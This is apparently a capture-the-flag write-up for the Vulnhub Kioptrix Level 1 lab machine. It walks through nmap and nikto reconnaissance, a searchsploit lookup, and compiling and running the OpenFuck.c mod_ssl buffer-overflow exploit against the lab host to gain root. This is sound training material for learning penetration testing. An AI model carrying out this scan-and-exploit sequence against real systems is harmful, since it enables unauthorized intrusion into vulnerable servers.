
# Kioptrix Level 1
1. We need to find the machine IP on our network:

	* ```ip addr show```
 ``` root@kali:~/Desktop# ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:e7:ed:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.9/24 brd 192.168.50.255 scope global dynamic noprefixroute eth0
       valid_lft 81286sec preferred_lft 81286sec
    inet6 fe80::20c:29ff:fee7:edef/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

```

* 	 * From this output we can see on eth0:inet we have ```192.168.50.9/24```
	 * Map your local network to find the ip of the Vulnhub Machine
	 * ```nmap 192.168.50.9/24```

 ```
Nmap scan report for 192.168.50.207
Host is up (0.000072s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm
MAC Address: 00:0C:29:78:29:0C (VMware)
```


*   * Our Vulnhub Machine is ```192.168.50.207```
2. Lets take a look at the nmap
	* We see some ports open but first we should take a look at the site since port 80 is open
3. Taking a look at the webpage
	* ![Screenshot][K1homepage]
	* From the basic page we know that this is an Apache server running on Red Hat Linux
	* Clicking on any of the links will take you to an error page like so:
	* ![Screenshot][K1errorpage]
	* We now know it is running ```Apache 1.3.20```
4. Checking if Apache 1.3.20 is vulnerable
	* We're going to see whether 1.3.20 has published exploits using searchsploit which searches [Exploit-db](https://www.exploit-db.com/)
	* Run ```searchsploit Apache```
	* Looking around, I couldn't find anything that I could use
	* We will try to see if ```nikto``` a web server scanner, can give us any more information
	* Run ```nikto -h 192.168.50.207```
	* Taking a look back at the ```searchsploit``` results, we can see that there is an exploit for mod_ssl versions
```root@kali:~# nikto -h 192.168.50.207
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.50.207
+ Target Hostname:    192.168.50.207
+ Target Port:        80
+ Start Time:         2018-04-09 12:50:40 (GMT-4)
---------------------------------------------------------------------------
...
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ 8345 requests: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2018-04-09 12:51:00 (GMT-4) (20 seconds)
```

* 	* In our previous ```searchsploit``` there was a mod_ssl exploit which we can leverage since we know now that mod_ssl is on 2.8.4

	* ```Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overf | exploits/unix/remote/21671.c```
	* For other searchsploit's, you can get a copy into your current directory by using mirror
	* ```searchsploit -m exploits/unix/remote/21671.c```
	* There are many resources online on how to update OpenFuck.c, but I chose to use [this](https://github.com/gazcbm/openfuck-2017)
5. Exploiting using OpenFuck.c
	* Using the instructions included in the file:
	* ```gcc -o OpenFuck OpenFuck.c -lcrypto```
	* ```./openfuck 0x6b 192.168.50.207 443 -c 50```

ROOTED!

[K1homepage]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/K1homepage.png
[K1errorpage]: https://github.com/jawyuhz/Vulnhub_Writeups/blob/master/Screenshots/K1errorpage.png